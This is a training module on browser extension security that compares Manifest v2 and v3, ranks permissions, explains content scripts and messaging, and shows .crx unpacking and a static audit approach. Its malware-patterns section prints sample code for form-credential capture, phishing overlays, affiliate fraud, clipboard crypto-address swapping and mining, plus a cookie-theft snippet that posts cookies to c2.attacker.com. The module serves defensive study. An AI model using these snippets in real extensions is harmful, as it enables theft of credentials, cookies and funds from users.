# Module 33 — Browser Extension Security

## 1. Manifest v2 vs Manifest v3

Browser extensions declare their capabilities, permissions, and code entry points in a `manifest.json` file. Chrome and Chromium-based browsers have undergone a major architectural shift from Manifest Version 2 (MV2) to Manifest Version 3 (MV3). Firefox uses its own versioning but tracks both standards.

### Background Execution Model

**MV2 — Persistent Background Pages**

MV2 extensions can declare a background page — a long-lived HTML page that runs JavaScript indefinitely as long as the browser is open. It can maintain state in variables, hold WebSocket connections, and react to any browser event at any time.

```json
"background": {
  "scripts": ["background.js"],
  "persistent": false
}
```

Setting `"persistent": false` gives a "non-persistent" event page, which the browser can unload when idle, but it will be restarted on any relevant event. Malicious extensions frequently used persistent background pages to maintain C2 communication without interruption.

**MV3 — Service Workers**

MV3 replaces background pages with service workers — ephemeral JavaScript workers with no access to the DOM, no persistent global state between invocations, and a 5-minute hard timeout per activation. State must be serialized to `chrome.storage` before the worker shuts down.

```json
"background": {
  "service_worker": "background.js"
}
```

Implications for security research:
- MV3 extensions cannot maintain persistent TCP or WebSocket connections reliably
- Beaconing/polling must be done through alarms API (`chrome.alarms`)
- Exfiltration payloads must be queued in storage and flushed on worker wake
- MV3 makes long-running C2 channels harder but does not prevent them — attackers adapt by using alarm-based polling

### Network Request Modification

**MV2 — `webRequestBlocking`**

The `webRequest` API (with `blocking` parameter) allowed extensions to intercept, inspect, modify, or cancel network requests synchronously before they were sent. This was extremely powerful — both for legitimate ad-blockers and for malware that could strip Content Security Policy headers, redirect HTTPS to HTTP, or inject credentials.

```json
"permissions": ["webRequest", "webRequestBlocking", "<all_urls>"]
```

**MV3 — `declarativeNetRequest`**

MV3 removes `webRequestBlocking` and replaces it with `declarativeNetRequest` — a declarative rule engine where the extension provides JSON rule sets and the browser enforces them without the extension seeing request content.

```json
"permissions": ["declarativeNetRequest"],
"declarative_net_request": {
  "rule_resources": [{
    "id": "ruleset_1",
    "enabled": true,
    "path": "rules.json"
  }]
}
```

Security implication: extensions can no longer strip CSP headers, inject content into arbitrary responses, or read request bodies in transit. This is a significant mitigation against header-stripping attacks, but extensions retain the ability to redirect requests and block them.

### Host Permissions

In MV2, host permissions were embedded in the `permissions` array. In MV3 they are separated into `host_permissions`:

```json
// MV2
"permissions": ["tabs", "<all_urls>"]

// MV3
"permissions": ["tabs"],
"host_permissions": ["<all_urls>"]
```

MV3 also introduces "optional host permissions" — the user must actively grant them at runtime rather than at install time, reducing the attack surface of freshly installed extensions.

---

## 2. Permission Risk Levels

Chrome/Firefox permissions are declared in `manifest.json` under `permissions`, `optional_permissions`, and (MV3) `host_permissions`. Each grants different levels of browser access.

### Critical

| Permission | What It Grants | Abuse Vector |
|---|---|---|
| `nativeMessaging` | Spawn arbitrary native host executables registered in OS registry | Full OS RCE via native host |
| `debugger` | CDP (Chrome DevTools Protocol) attach to any tab | Read/write tab memory, extract form fields, execute JS in any tab context |
| `proxy` | Control the browser's proxy settings | Route all traffic through attacker proxy |

These permissions alone represent complete compromise of the browser session and potentially the OS.

### High

| Permission | What It Grants | Abuse Vector |
|---|---|---|
| `<all_urls>` or `*://*/*` | Content script injection + XHR on any site | Universal cookie theft, form capture, DOM manipulation |
| `cookies` | Read/write all cookies for any URL | Session hijacking, credential theft |
| `tabs` | Access to tab URL, title, favIcon; execute scripts | Site history exposure, targeted injection |
| `webNavigation` | Track all navigation events | Browse history reconstruction, timing attacks |
| `browsingData` | Delete cookies, cache, history | Cover-track erasure, persistent cookie replacement |
| `downloads` | Initiate downloads, read download history | Silent file drops, exfil via download API |
| `management` | Install/uninstall/enable/disable extensions | Extension supply-chain attacks |
| `privacy` | Modify privacy settings, disable HTTPS-only | SSL stripping enablement |

### Medium

| Permission | What It Grants | Abuse Vector |
|---|---|---|
| `storage` | Read/write extension's own key-value store | Persist stolen data between sessions |
| `notifications` | Display OS notifications | Phishing overlays, social engineering |
| `history` | Access full browsing history | Intelligence gathering, targeted attacks |
| `bookmarks` | Access/modify bookmarks | Credential hints in bookmark names |
| `clipboardRead` | Read clipboard contents | Clipboard-based credential theft |
| `clipboardWrite` | Overwrite clipboard | Crypto address replacement |
| `activeTab` | Access current tab's URL + execute scripts once | Targeted tab-specific attacks |

### Low

| Permission | What It Grants |
|---|---|
| `contextMenus` | Add items to right-click menu |
| `alarms` | Schedule periodic callbacks |
| `idle` | Detect user idle state |
| `unlimitedStorage` | Remove 5MB storage cap |
| `gcm` | Google Cloud Messaging (legacy push) |

---

## 3. Content Script Injection Model

Content scripts are JavaScript files that run in the context of web pages — they can access and modify the DOM, read form values, intercept events, and communicate with the extension's background context.

### Match Patterns

The `content_scripts` manifest key controls which pages receive a script injection:

```json
"content_scripts": [{
  "matches": ["https://*.bank.com/*", "http://login.example.com/signin"],
  "js": ["content.js"],
  "css": ["overlay.css"],
  "run_at": "document_start",
  "all_frames": true
}]
```

**Pattern syntax:** `<scheme>://<host>/<path>` where wildcards `*` can substitute the entire host or path. Common patterns and their risk:

| Pattern | Scope |
|---|---|
| `<all_urls>` | Every page in every scheme |
| `*://*/*` | All HTTP and HTTPS |
| `https://*.google.com/*` | All Google subdomains |
| `https://example.com/*` | One domain only |

### `run_at` Values

- `document_start` — inject before any DOM is parsed; can intercept inline scripts, override globals
- `document_end` — after DOM is ready but before `DOMContentLoaded`; default
- `document_idle` — after `DOMContentLoaded`, when the page is interactive

**Security significance:** `document_start` injection allows an attacker to hook `XMLHttpRequest.prototype.send`, `fetch`, form `submit` events, and `addEventListener` before the legitimate page code runs — a perfect position for a keylogger or credential interceptor.

### `all_frames`

When `true`, the content script injects into every `<iframe>` on the page as well as the top-level frame. This is required to capture credentials entered in iframed login forms (common in payment flows and single-sign-on pages).

### Isolated World

Content scripts execute in an "isolated world" — they share the DOM with page scripts but have a separate JavaScript execution context. `window.foo` set by page code is not directly visible to the content script's `window.foo`, but the DOM is shared, so content scripts can read input values, observe `window.location`, and intercept `postMessage`.

Content scripts can break the isolation boundary via `window.wrappedJSObject` (Firefox) or by injecting a `<script>` tag into the DOM.

---

## 4. Cross-Origin XHR from Extensions

Normal web pages are restricted by Same-Origin Policy. Extensions with appropriate host permissions bypass this:

```json
"host_permissions": ["<all_urls>"]
```

An extension's background service worker or content script can make XHR/fetch requests to any domain. This enables:
- Exfiltrating captured credentials to an attacker-controlled server
- Fetching new payload code from a remote C2
- Beaconing (periodic check-ins with victim metadata)

Content scripts are more restricted: they can make cross-origin requests only if the target domain is listed in `host_permissions`. Background scripts (service workers) can reach any permitted host.

A common pattern in malicious extensions is to collect data in the content script, send it to the background via `runtime.sendMessage`, and exfiltrate from the background to avoid triggering CORS errors visible in the page's DevTools.

---

## 5. `chrome.storage` API

Extensions have access to two storage areas:

| Area | Scope | Quota | Notes |
|---|---|---|---|
| `chrome.storage.local` | Local device only | 5MB (or unlimited with permission) | Survives restarts |
| `chrome.storage.sync` | Synced via Google account | 100KB | Potential data exfil channel |
| `chrome.storage.session` | Per browser session | 1MB | Cleared on browser close |
| `chrome.storage.managed` | Pushed by enterprise policy | Read-only | |

Malicious extensions frequently stage stolen data in `storage.local` and periodically flush it to a remote server. The sync store is notable as a covert channel — data stored there can appear on any browser signed into the same Google account.

---

## 6. Message Passing

Extensions use a message-passing system to communicate between contexts (background ↔ content script ↔ popup ↔ DevTools panel).

### One-Time Messages

```javascript
// From content script to background:
chrome.runtime.sendMessage({type: "credentials", data: {...}}, response => {
  console.log(response.status);
});

// In background service worker:
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.type === "credentials") {
    exfiltrate(msg.data);
    sendResponse({status: "ok"});
  }
});
```

### Long-Lived Connections (Ports)

```javascript
// Connect from content script:
const port = chrome.runtime.connect({name: "data-stream"});
port.postMessage({chunk: buffer});

// In background:
chrome.runtime.onConnect.addListener(port => {
  port.onMessage.addListener(msg => { /* handle chunk */ });
});
```

### `externally_connectable`

Extensions can be configured to accept messages from specific web page origins:

```json
"externally_connectable": {
  "matches": ["https://*.example.com/*"]
}
```

This creates a bridge from a web page into the extension, which can be abused if the match patterns are too broad.

---

## 7. Common Extension Malware Patterns

### Tab Hijacking

Replacing tab content or redirecting navigations:

```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url.includes("bank.com")) {
    chrome.tabs.executeScript(tabId, {file: "phishing_overlay.js"});
  }
});
```

### Form Data Exfiltration (Keylogging)

Injected at `document_start` to capture credentials before submission:

```javascript
document.addEventListener("submit", e => {
  const form = e.target;
  const data = {};
  form.querySelectorAll("input").forEach(i => data[i.name] = i.value);
  chrome.runtime.sendMessage({type: "form", url: location.href, fields: data});
});
```

### Ad Injection / Affiliate Fraud

Modifying affiliate link parameters or injecting additional ad units:

```javascript
document.querySelectorAll('a[href*="amazon.com"]').forEach(link => {
  link.href = link.href.replace(/tag=[^&]+/, "tag=attacker-20");
});
```

### Cryptocurrency Address Replacement

Clipboard hijacking for crypto transactions:

```javascript
document.addEventListener("copy", e => {
  const text = window.getSelection().toString();
  if (/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(text)) {
    e.clipboardData.setData("text/plain", ATTACKER_WALLET);
    e.preventDefault();
  }
});
```

### In-Browser Crypto Mining

Loading WebAssembly-based miners (CoinHive-style):

```javascript
const miner = new Worker(chrome.runtime.getURL("miner.js"));
miner.postMessage({pool: "pool.minexmr.com:443", wallet: "..."});
```

### History Sniffing / User Profiling

```javascript
// Classic timing attack (largely mitigated in modern browsers):
for (const url of TARGET_URLS) {
  const a = document.createElement("a");
  a.href = url;
  document.body.appendChild(a);
  const visited = getComputedStyle(a).color !== "rgb(0, 0, 238)";
  if (visited) report(url);
}
```

### Cookie Theft

```javascript
chrome.cookies.getAll({}, cookies => {
  fetch("https://c2.attacker.com/ingest", {
    method: "POST",
    body: JSON.stringify(cookies)
  });
});
```

---

## 8. Unpacking .crx Files

Chrome extensions are distributed as `.crx` files — a custom format wrapping a ZIP archive.

### CRX3 Binary Format

```
Offset  Size  Description
0       4     Magic: "Cr24" (0x43723234)
4       4     Version: 0x03000000 (little-endian = 3)
8       4     Header size (includes the proto-header)
12      ?     CrxFileHeader (protobuf — SHA-256 hash proofs + public key)
?       ?     ZIP archive (standard .zip)
```

### CRX2 Binary Format (legacy)

```
Offset  Size  Description
0       4     Magic: "Cr24" (0x43723234)
4       4     Version: 0x02000000 (little-endian = 2)
8       4     Public key length (pubkey_len)
12      4     Signature length (sig_len)
16      pubkey_len  RSA public key (DER-encoded)
16+pub  sig_len     RSA signature over ZIP data
16+pub+sig  ?       ZIP archive
```

### Extraction (Python)

```python
import struct, zipfile, io

def unpack_crx(path):
    with open(path, "rb") as f:
        data = f.read()
    magic = data[:4]
    if magic != b"Cr24":
        raise ValueError("Not a .crx file")
    version = struct.unpack_from("<I", data, 4)[0]
    if version == 2:
        pubkey_len = struct.unpack_from("<I", data, 8)[0]
        sig_len    = struct.unpack_from("<I", data, 12)[0]
        zip_start  = 16 + pubkey_len + sig_len
    elif version == 3:
        header_len = struct.unpack_from("<I", data, 8)[0]
        zip_start  = 12 + header_len
    else:
        raise ValueError(f"Unknown CRX version {version}")
    return zipfile.ZipFile(io.BytesIO(data[zip_start:]))
```

---

## 9. Extension Fingerprinting via Page URLs

Extensions expose files through the `chrome-extension://` scheme:

```
chrome-extension://<EXTENSION_ID>/popup.html
chrome-extension://<EXTENSION_ID>/icons/logo.png
```

The `<EXTENSION_ID>` is a deterministic 32-character Base-16 string derived from the SHA-256 of the extension's public key. It is stable across installs and versions.

### Web-Accessible Resources

Extensions must explicitly declare which resources can be fetched by web pages:

```json
// MV2
"web_accessible_resources": ["images/*.png", "fonts/*.woff2"]

// MV3
"web_accessible_resources": [{
  "resources": ["images/*.png"],
  "matches": ["https://*.example.com/*"]
}]
```

MV3 tightens this by requiring a `matches` filter. Any file listed in `web_accessible_resources` is fetchable by a web page with a matching origin, which means:

1. A web page can probe `chrome-extension://<ID>/resource.png` with a fetch/img tag
2. If it loads, the extension is installed
3. By probing known extension IDs, a page can enumerate installed extensions
4. This can identify security tools (VPNs, password managers, ad-blockers) or confirm a target is running a specific vulnerable extension

### Timing Side-Channel (Historical)

Even without WAR declarations, extensions had a timing-based fingerprint: fetching a `chrome-extension://` resource that doesn't exist is instant, but fetching one that does (even if blocked) shows a slight timing difference. Modern browsers have largely closed this, but it was widely exploited in the 2014–2019 era.

---

## 10. Static Analysis Approach

When auditing an unknown extension:

1. **Extract:** Unpack `.crx`/`.zip` or read directory
2. **Read manifest:** Identify version, permissions, content scripts, background, update_url
3. **Score permissions:** Flag CRITICAL/HIGH permissions before reading code
4. **Trace content scripts:** Check match patterns (how broad?), run_at, all_frames
5. **Audit JS:** Look for eval, innerHTML, external XHR, form capture, crypto patterns
6. **Map network endpoints:** All URLs in all JS files — classify as internal/trusted/suspicious
7. **Check update_url:** If present and external, the extension can silently update itself to new code
8. **Correlate findings:** Broad permissions + external C2 URLs + form capture = high confidence malware

---

## Lab Setup

```bash
# Unpack a CRX from Chrome's extension directory
cp ~/.config/google-chrome/Default/Extensions/<ext_id>/<version>.crx /tmp/
cd /tmp && python3 unpack.py <version>.crx ./unpacked/

# Or load from Chrome's extensions page
# chrome://extensions → Enable Developer Mode → "Pack extension"
```

**Tools used in this module:**
- `ext_auditor.py` — full static auditor (stdin: dir/crx/zip, outputs: text/json/html)
- `solutions/sol01_manifest_parser.py` → `solutions/sol04_network_auditor.py` — focused exercises
